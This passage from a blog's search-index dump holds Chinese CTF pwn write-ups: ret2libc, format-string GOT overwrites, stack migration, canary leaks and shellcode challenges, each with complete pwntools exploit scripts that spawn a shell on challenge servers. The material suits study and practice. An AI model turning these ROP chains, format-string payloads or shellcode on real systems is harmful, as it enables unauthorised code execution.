ELF(&#x27;./aaa&#x27;)main=0x4011DF#backdoor=0x4011A5rdi=0x401176ret=0x40101ash=0x402065aaputs_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]payload=b&#x27;a&#x27;*(0xa+0x08)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.recvuntil(&quot;do?&quot;)p.sendline(payload)#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(&quot;puts_addr:&quot;+hex(puts_addr))libc = ELF(&#x27;./libc.so.6&#x27;)#libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libcbase = puts_addr - libc.sym[&#x27;puts&#x27;]binsh_addr=next(libc.search(b&#x27;/bin/sh&#x27;))#binsh = libc.search(&quot;/bin/sh&quot;).next()bin_sh_addr = libcbase + binsh_addrsys_addr = libcbase + libc.sym[&#x27;system&#x27;]payload2 = b&#x27;a&#x27;*(0xa+0x08) + p64(ret) + p64(rdi) + p64(bin_sh_addr) + p64(sys_addr)p.recvuntil(&quot;do?&quot;)p.sendline(payload2)p.interactive() week3format_string_level2泄露printf的got表地址，将其覆盖成system的地址，往read里输入&#x2F;bin&#x2F;sh，执行printf时即可直接取得shell 以下是exp 123456789101112131415161718192021222324252627282930313233from pwn import *from LibcSearcher import LibcSearchercontext(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)filename=&#x27;./fmt2&#x27;elf = ELF(filename)#elf = context.binary = ELF(filename)#libc = elf.libcp=remote(&#x27;challenge.basectf.fun&#x27;,37853)#p=process(filename)#libc=ELF(&quot;/home/kali/Desktop/比赛/newstar_week3/libc.so.6&quot;)printf_got=elf.got[&#x27;printf&#x27;]payload=b&#x27;%7$saaaa&#x27;payload+=p64(printf_got)p.send(payload)printf_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(printf_addr))libc = LibcSearcher(&#x27;printf&#x27;, printf_addr)libc_base=printf_addr-libc.dump(&#x27;printf&#x27;)#libc_base = printf_addr - (0x7afb4e4606f0 - 0x7afb4e400000)sys_addr=libc_base+libc.dump(&#x27;system&#x27;)print(&#x27;system:&#x27;,hex(sys_addr))offset=6payload1=fmtstr_payload(offset, &#123;printf_got: sys_addr&#125;)p.sendline(payload1)p.send(b&#x27;/bin/sh\\x00&#x27;)p.interactive()#libc6_2.35-0ubuntu3.8_amd64 4 stack_in_stack先接收buf地址，再利用栈迁移执行后门函数，回到主函数，接收后门函数给的puts地址，再次运行主函数时，buf地址改变，重新接收，利用puts地址计算出libc基地址，system地址，str_bin_sh地址，最后再次利用栈迁移，布置栈空间取得shell，程序中没有pop rdi_ret，可以在附件给我libc中找到 以下是exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *from struct import pack#from LibcSearcher import LibcSearcherfilename=&#x27;./attachment&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)io=remote(&#x27;challenge.basectf.fun&#x27;,24313)#io=process(filename)libc = ELF(&quot;./libc.so.6&quot;)leave=0x4012f2backdoor=0x4011ddmain=0x40124aret=0x4012f3io.recvuntil(b&#x27;960.&#x27;)buf=int(io.recv(16),16)print(hex(buf))payload=p64(ret)+p64(backdoor)+p64(ret)+p64(main)+b&#x27;a&#x27;*0x10+p64(buf-0x8)+p64(leave)io.send(payload)#io.recvuntil(b&#x27;ret!\\n&#x27;)puts_addr=int(io.recv(14),16)print(&#x27;puts_addr: &#x27;,hex(puts_addr))#pause()#puts_addr=u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))io.recvuntil(b&#x27;960.&#x27;)buf2 = int(io.recv(16),16)print(hex(buf2))libc_base=puts_addr-libc.sym.puts#sys_addr=puts_addr-0xc300e0sys_addr=libc_base+libc.sym.system#bin_sh = puts_addr + 0x157828bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))print(hex(sys_addr))print(hex(bin_sh))pop_rdi = libc_base + 0x000000000002a3e5payload1= p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) +b&#x27;a&#x27;*0x18 # &#x27;ret&#x27; is for rsp alignmentpayload1 += p64(buf2-0x8) + p64(leave)io.send(payload1)io.interactive() 你为什么不让我溢出canary最后一位是\\x00,此时我们可以输入一定数量的‘a’到canary位置，这会导致printf输出时将canary连带打出来，这题就可以解决了 以下是exp 12345678910111213141516171819202122232425262728from pwn import *import struct#from LibcSearcher import LibcSearcherfilename=&#x27;./你为什么不让我溢出&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=remote(&#x27;challenge.basectf.fun&#x27;,30864)#p=process(filename)p.recvuntil(b&#x27;ker!\\n&#x27;)p.send(b&#x27;a&#x27;*(0x70-0x9)+b&#x27;c&#x27;+b&#x27;d&#x27;)#p.recvuntil(b&#x27;\\x62&#x27;)#p.recvuntil(&#x27;\\x0a&#x27;)p.recvuntil(b&#x27;c&#x27;)backdoor=0x4011b6#canary = int(p.recv(8).hex(), 16)canary=u64(p.recv(8))-0x64#canary &amp;= 0x00FFFFFFFFFFFFFF # 将 64 位整数转换为小端字节序的字节串# 在字节序列的开头添加一个 0x00pause()payload=b&#x27;a&#x27;*(0x70-0x8)+p64(canary)+b&#x27;a&#x27;*0x8+p64(0x40101a)+p64(backdoor)p.send(payload)#gdb.attach(p)p.interactive()","categories":[],"tags":[]},{"title":"Hello Hnu！","slug":"栈迁移","date":"2024-09-04T07:46:25.049Z","updated":"2024-09-24T14:15:30.574Z","comments":true,"path":"2024/09/04/栈迁移/","permalink":"http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"栈迁移当可操控的栈空间不多时可以尝试 原理在x64架构下，栈空间通过rsp和rbp寄存器进行标识，在函数执行的开始时，会执行call指令，在函数结束时，会执行leave ret返回 123456789101112131415函数调用时栈空间操作的最基本情况 -&gt; 函数调用：callpush eip# 函数返回地址压入栈内，此时rsp自动减去0x8push rbp # 保存父函数栈底指针到栈内，此时rsp自动减去0x8mov rsp,rbp # 设置被调用函数的栈底指针sub rsp,xxx # 分配栈空间 leave # 相当于下方指令进行的操作 mov rsp,rbp ## 释放之前分配的栈空间 pop rbp ## 从栈上取出之前保存的父函数栈底指针到rbp，此时rsp自动加上0x8ret pop eip# 从栈上取出返回地址，然后返回，此时rsp自动加上0x8 栈迁移如何进行想要把栈空间迁移到指定的位置，核心的原理就是修改rsp和rbp寄存器的数值，让它们指向我们期望中的位置。 首先，我们需要在搞清楚输入的数据位于栈内的地址，接着我们可以往栈内填入需要的内容，例如pop_rdi，ret，等的地址来构造shellcode，再补全payload直至rbp的位置，往rbp里填入需要返回的地址back_addr-0x8（32位加上0x4，后面会清楚为什么的），在函数返回地址的空间内填入leave_ret_addr，当函数执行结束时，首先会执行mov rsp,rbp，将栈顶和栈底放置于同一个位置，pop rbp，此时ebp会返回我们已经填入返回地址back_addr-0x8，pop rip，此时rip会指向leave_ret_addr，随后再次执行leave ret, mov rsp,rbp,将栈顶和栈底放置于同一个位置,pop rbp,此时rsp会自动加0x8，到达back_addr，pop rip,接着执行我们填入的东西，到这里栈迁移的过程已经差不多结束了。 接下来进入实战 stack migration 来自newstar week2，可以自己去buuctf自行下载 如题，栈迁移，做题前自己去了解了以下，打算把自己的理解写出来，详见我的博客cwj-happy.github.io 拿到题先checksec一下，看看开了什么保护 没开pie，给了libc文件，很明显的提示，进ida反编译验证一下猜想 给了buf的地址，v2可以栈溢出，但没给足够的空间，这里可以想到用栈迁移实现变相拉大溢出空间的效果，然后通过泄露puts_got表地址，找到libc基地址，加上偏移找到system地址和bin&#x2F;sh地址，填入栈空间，最终得到shell 这里先随意输个字符，通过第一个read，接收buf地址，接着构造payload泄露puts_got表地址 拿到puts_got表地址，接着就是正常ret2libc，重复和上面的操作即可拿到shell 这里其实可以直接用buf 的地址算出libc基地址，简便很多，详情见官方write up 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *#from LibcSearcher import LibcSearcherfilename=&#x27;./stack&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27127)p=process(filename)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi=0x401333ret=0x40101aleave=0x4012aamain=0x4011fbputs_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x1)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8print(hex(buf))payload=p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)payload=payload.ljust(80,b&#x27;a&#x27;)+p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload)#p.recvuntil(b&#x27;plz:&#x27;)#p.sendline(payload)p.recvuntil(&#x27;soon!\\n&#x27;)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]sys=libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x7)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8payload1=b&#x27;a&#x27;*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)payload1=payload1.ljust(0x50,b&#x27;a&#x27;)payload1+=p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload1)p.interactive()","categories":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"}]},{"title":"iamorange--fmt2/got-it","slug":"iamorange--fmt2__got-it","date":"2024-09-02T07:14:02.205Z","updated":"2024-09-04T02:56:32.861Z","comments":true,"path":"2024/09/02/iamorange--fmt2__got-it/","permalink":"http://example.com/2024/09/02/iamorange--fmt2__got-it/","excerpt":"","text":"fmt2checksec一下，开了pie保护，nx保护运行一遍瞧瞧，有格式化字符串漏洞丢ida里反编译看看，可以看到，当参数a等于’deadeef’,就可以执行sys，看看a的位置吧进gdb调试一下吧，可以看到main的地址存放在栈中，可利用格式化字符串漏洞泄露出main 的地址，计算出基地址，加上参数a的偏移量，就可以获取参数a的真实地址，再利用利用格式化字符串漏洞往里写入’deadbeef’，即可通过判断，执行sys以下是exp 123456789101112131415161718192021222324252627282930from pwn import *#from LibcSearcher import *filename=&#x27;./fmt2&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)p=process(filename)pie=0x0000000000004048p.recvuntil(&#x27;Input your content: &#x27;)p.send(b&#x27;%41$p&#x27;)main_addr = int(p.recv(14),16)print(hex(main_addr))elf_addr=main_addr-elf.sym[&#x27;main&#x27;]a_addr=elf_addr+piepayload = b&quot;%239c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr) #\\xefp.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%190c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+1) #\\xbep.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%173c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+2) #\\adp.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%222c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+3) #\\xdep.sendlineafter(b&#x27;content: &#x27;,payload)p.interactive() got-itgot表劫持漏洞，checksec一下，partial relro，可以修改plt&#x2F;got表进ida反编译看看，点进各个函数看看可以通过输入，将v1赋值负数，实现数组越界，edit函数可以对其实现修改，show函数可以泄露其地址，trick函数中exit()函数的参数正好为binsh，将exit_got地址改为system，执行exit即可拿到控制权计算出puts_got地址距离list为0x88 当v1为-17时，即可到达puts_got表地址，通过show函数泄露puts_got地址，算出libc基地址，通过计算sys_addr&#x3D;libc_base+elf.sym[‘system’]拿到system地址，通过计算，exit距list 0x58 当v1为-8时即可到达exit地址，通过edit函数，将exit地址改为system，最后运行trick函数即可以下是exp有个小问题，这里附件给的libc文件应该是远端用给的，程序跑在本地应该用本地的libc，跑起来正如我所料 123456789101112131415161718192021222324252627282930from pwn import *#from LibcSearcher import *filename=&#x27;./got-it&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)p=process(filename)elf=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;2&#x27;)p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-17&#x27;)puts_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))#pause()libc_base=puts_addr-elf.sym[&#x27;puts&#x27;]sys_addr=libc_base+elf.sym[&#x27;system&#x27;]print(hex(sys_addr))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;1&#x27;)p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-11&#x27;)p.sendlineafter(&quot;Input student name: &quot;,p64(sys_addr))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;8227&#x27;)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Newstar_week2","slug":"Newstar_week2","date":"2024-09-01T08:32:10.107Z","updated":"2024-09-04T02:56:17.999Z","comments":true,"path":"2024/09/01/Newstar_week2/","permalink":"http://example.com/2024/09/01/Newstar_week2/","excerpt":"","text":"Newstar_week2ret2libc简单的看看开了什么保护吧，没开pie 运行一下看看 丢ida里反编译看看，可以栈溢出，很普通的ret2libc 以下是exp 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import LibcSearcherelf = ELF(&#x27;./ret2libc&#x27;)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,27127)#p=process(&#x27;./ret2libc&#x27;)ret_addr = 0x400506main_addr=0x400698pop_rdi_ret = 0x400763 puts_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]padding = b&#x27;a&#x27;*(0x20+8)#io = remote(&quot;node4.anna.nssctf.cn&quot;,28729)payload = padding+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)#payload = flat([padding, pop_rdi_ret, elf.got[&#x27;puts&#x27;], elf.plt[&#x27;puts&#x27;], main_addr])p.recvuntil(&#x27;again&#x27;)p.sendline(payload)#puts_addr = int(unpack(p.recvuntil(&#x27;\\n&#x27;,drop=True).ljust(8,b&#x27;\\x00&#x27;)))#puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))puts_addr=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)str_bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = padding+p64(ret_addr)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)p.sendafter(b&#x27;again\\n&#x27;,payload2)p.interactive() secretnumberchecksec看看，开了全保护 运行一下进ida里反编译看看 出现了格式化字符漏洞，gdb调试一下看看，看到了main的地址，通过计算得到基地址，所以我们的思路就得到了，修改secret的值，通过格式化字符串泄露出main的地址，然后通过计算得出基地址，基地址加上偏移量得到secret的地址，再通过格式化字符串写入 以下是exp 1234567891011121314151617181920212223242526272829from ctypes import *from pwn import * #clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p=process(&#x27;./secretnumber&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28891)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) p.recvuntil(&#x27;Give me some gift?(0/1)&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(&#x27;it&#x27;)p.sendline(b&#x27;aaaaaaaa%17$p&#x27;)p.recvuntil(&#x27;aaaaaaaa&#x27;) main_addr=int(p.recvuntil(&#x27;f5&#x27;)[-12:],16)real = main_addr-0x12F5+0x404cprint(real)p.recvuntil(&#x27;Give me some gift?(0/1)&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(&#x27;it&#x27;)offset=8fmtpayload=fmtstr_payload(offset, &#123;real:1&#125;)p.sendline(fmtpayload)p.sendlineafter(&quot;(0/1)\\n&quot;,&#x27;0&#x27;) p.sendlineafter(&quot;Guess the number\\n&quot;,&#x27;1&#x27;)p.interactive() canary 这里引用ctf-wiki 开启 Canary 保护的 stack 结构大概如下： 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | canary value | +-----------------+ | local variables | Low | | Address 普通的canary,checksec看看保护，开了canary，没开pie 直接丢ida反编译看看什么情况，有后门函数，出现了格式化字符串漏洞，到这里大致有了点思路，通过格式化字符串泄露canary，再通过栈溢出打通 接下来gdb调试，寻找canary，可以看到canary在rbp之上，所以可以输入%11$p泄露canary 接下来就是基操了，以下是exp 1234567891011121314from pwn import *context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)p=process(&#x27;./canary&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)p.recvuntil(&#x27;gift?\\n&#x27;)p.sendline(b&#x27;%11$p&#x27;)p.recvuntil(b&#x27;gift:\\n&#x27;)canary=int(p.recv(18),16)print(hex(canary))backdoor=0x401262payload=b&#x27;a&#x27;*(0x30-0x8)+p64(canary)+b&#x27;a&#x27;*0x8+p64(backdoor)p.recvuntil(&#x27;magic\\n&#x27;)p.sendline(payload)p.interactive() stack migration如题，栈迁移，做题前自己去了解了以下，打算把自己的理解写出来，详见我的博客cwj-happy.github.io 拿到题先checksec一下，看看开了什么保护 没开pie，给了libc文件，很明显的提示，进ida反编译验证一下猜想 给了buf的地址，v2可以栈溢出，但没给足够的空间，这里可以想到用栈迁移实现变相拉大溢出空间的效果，然后通过泄露puts_got表地址，找到libc基地址，加上偏移找到system地址和bin&#x2F;sh地址，填入栈空间，最终得到shell 这里先随意输个字符，通过第一个read，接收buf地址，接着构造payload泄露puts_got表地址 拿到puts_got表地址，接着就是正常ret2libc，重复和上面的操作即可拿到shell 这里其实可以直接用buf 的地址算出libc基地址，简便很多，详情见官方write up 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *#from LibcSearcher import LibcSearcherfilename=&#x27;./stack&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27127)p=process(filename)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi=0x401333ret=0x40101aleave=0x4012aamain=0x4011fbputs_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x1)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8print(hex(buf))payload=p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)payload=payload.ljust(80,b&#x27;a&#x27;)+p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload)#p.recvuntil(b&#x27;plz:&#x27;)#p.sendline(payload)p.recvuntil(&#x27;soon!\\n&#x27;)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]sys=libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x7)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8payload1=b&#x27;a&#x27;*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)payload1=payload1.ljust(0x50,b&#x27;a&#x27;)payload1+=p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload1)p.interactive() shellcode revenge不会，等我会了，再回来写，先把官方write up贴出来、 12345678910111213141516171819202122232425262728293031from pwn import * context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;) p = remote(&quot;node4.buuoj.cn&quot;,27904) #p = process(&#x27;./shellcodere&#x27;) payload = b&#x27;\\x33\\x42\\x38&#x27; #33 42 38 xor eax, DWORD PTR [rdx+0x38] payload += b&#x27;\\x31\\x42\\x30&#x27; #31 42 30 xor DWORD PTR [rdx+0x30], eax payload += b&#x27;\\x33\\x42\\x37&#x27; #33 42 38 xor eax, DWORD PTR [rdx+0x38] payload += b&#x27;\\x31\\x42\\x38&#x27; #31 42 38 xor DWORD PTR [rdx+0x38], eax payload += b&#x27;\\x59&#x27;*(0x30-len(payload)) #59 pop rcx payload += b&#x27;\\x4e\\x44&#x27;*2 #syscall 0x4e^0x41=0xf 0x44^0x41=0x5 payload += b&#x27;A&#x27;*8 #xor key p.sendlineafter(&quot;magic\\n&quot;,payload) pause() p.sendline(b&#x27;\\x90&#x27;*0x50+asm(shellcraft.sh())) p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Newstar week1","slug":"Newstar-week1","date":"2024-08-30T01:29:50.981Z","updated":"2024-09-04T02:55:56.691Z","comments":true,"path":"2024/08/30/Newstar-week1/","permalink":"http://example.com/2024/08/30/Newstar-week1/","excerpt":"","text":"Ret2text很简单的栈溢出，checksec一下 64位，没开pie，运行一下看看没什么特殊的，直接丢ida里反编译看一眼很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击以下是exp 1234567891011121314151617from pwn import *#p = process([&#x27;./Ret2text&#x27;])p = remote(&#x27;node5.buuoj.cn&#x27;, 29795)#p64中输入十六进制的值，即进行变量覆写#p.recvuntil(&quot;name:\\n&quot;)#payload=b&#x27;1956681178&#x27;#p.sendline(payload)#p.recvuntil(&quot;enge\\n&quot;)system_binsh_addr=0x4011FBsh=0x08048670padding=0x20+0x8payload=b&#x27;a&#x27; * padding + p64(system_binsh_addr)p.recvuntil(&#x27;magic&#x27;)p.send(payload)#p.recv()p.interactive() ezshellcode很简单的ret2shellcode，运行一下看看先和上一题怎么一样，差点以为下错文件，checksec一下吧OK呀，直接给我打开ida反编译看看怎么回事没有后门函数，但开辟了一段可执行段，可以往可执行段里写shellcode，很不错，那就直接开始吧！以下是exp 1234567891011121314151617181920from pwn import * context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;140&#x27;]pwnfile = &#x27;./ezshellcode&#x27;elf = ELF(pwnfile)#libc = ELF(&#x27;&#x27;)#io = process(pwnfile)p = remote(&#x27;node5.buuoj.cn&#x27;,27667)#gdb.attach(io)pay = asm(shellcraft.sh()) #自动生成shellcode#pay = b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;#64位不可见shellcodep.recvuntil(&#x27;magic\\n&#x27;)p.send(pay) Newstart_shop整数溢出，checksec后，丢ida里反编译瞧瞧，发现是一堆的函数，点进去看看可以看到在判断的时候，是unsigned int类型，所以我们可以让money变成负数后，判断时就足够大了这个函数刚好可以做到，直接执行 p1eeechecksec一下，基本上能开的保护都开了运行一下看看运行一下也没什么东西，进ida里看看仔细看看有后门函数，正好也给了栈溢出的机会由于开了pie，基地址随机，只有后三位是固定的，所以可以通过栈溢出将返回地址后四位修改，看很多大佬的博客是通过爆破打通，这里我发现用64-68都打不通，69-6c甚至不需要爆破就能打通，由于read为程序最后一个函数，也调试不出来，希望有懂的大佬可以教教我以下是exp 12345678910111213141516171819&quot;&quot;&quot;from pwn import *p=process(&#x27;./aaa&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) #p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + p8(0x6c))p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + b&#x27;d&#x27;)#print(p.sendline(b&#x27;cat flag&#x27;))p.interactive()&quot;&quot;&quot;from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)p=process(&#x27;./aaa&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,26568)payload=b&#x27;a&#x27;*(32+8)+b&#x27;\\x69&#x27;p.sendlineafter(&#x27;!&#x27;,payload)p.interactive() Randomexp 12345678910111213141516171819from ctypes import *from pwn import * clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p=process(&#x27;./aaa&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29112)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) clibc.srand(clibc.time(0))v =clibc.rand() p.sendlineafter(b&quot;can you guess the number?&quot;, str(v).encode()) p.sendline(b&#x27;/bin/sh&#x27;)p.sendline(b&#x27;cat flag&#x27;) p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Hello Hnu！","slug":"PWN-orange","date":"2024-08-19T15:46:26.240Z","updated":"2024-09-03T02:43:12.182Z","comments":true,"path":"2024/08/19/PWN-orange/","permalink":"http://example.com/2024/08/19/PWN-orange/","excerpt":"","text":"netcat通过题目不难看出，nc 一下即可 shellcode拿到题目第一步 checksec 一下打开的栈不可执行，丢 ida 里看看产生了一段可执行段，进 gdb 验证一下很明显产生了一段可执行段，注意到 read 限制了输入大小，所以只能自己制作一段以下是攻击脚本from LibcSearcher import LibcSearcherfrom pwn import * context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)#p&#x3D;process(‘.&#x2F;aaa’)p &#x3D; remote(‘boom.01130328.xyz’, 39095)elf &#x3D; ELF(‘.&#x2F;pwn4’)rop &#x3D; ROP(‘.&#x2F;pwn4’)shellcode &#x3D; b’\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05’sh &#x3D; asm(shellcraft.sh())p.recvuntil(‘code:’)p.send(shellcode)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-08-19T02:51:34.469Z","updated":"2024-08-19T02:51:34.469Z","comments":true,"path":"2024/08/19/hello-world/","permalink":"http://example.com/2024/08/19/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"},{"name":"note","slug":"note","permalink":"http://example.com/categories/note/"},{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"write 